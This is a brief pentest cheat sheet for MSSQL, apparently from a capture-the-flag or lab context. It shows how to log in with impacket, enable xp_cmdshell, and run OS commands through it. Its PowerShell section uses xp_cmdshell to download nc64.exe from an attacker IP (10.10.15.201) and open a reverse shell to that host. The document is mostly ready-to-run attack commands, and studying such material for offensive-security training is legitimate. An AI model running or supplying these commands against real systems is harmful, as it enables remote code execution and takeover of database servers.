# MSSQL

Microsoft SQL Server (MSSQL) is a relational database management system (RDBMS) developed by Microsoft.

```console
cd /usr/share/doc/python3-impacket/examples
python mssql {DOMAIN}/{USERNAME}@{TARGET_IP} -windows-auth
```

## Commands
```console
# Check if the current user is sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');

# Enable advanced options
EXECUTE sp_configure 'show advanced options', 1;

# Apply the configuration
RECONFIGURE;

# Enable xp_cmdshell
EXECUTE sp_configure 'xp_cmdshell', 1;

# Apply the configuration
RECONFIGURE;

EXECUTE xp_cmdshell 'whoami'
```

## POWERSHELL
https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
https://github.com/int0x33/nc.exe/blob/master/nc64.exe

xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.15.201/nc64.exe -outfile nc64.exe"
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.15.201 443"

## Tips
* Try -windows-auth to use Windows Authentication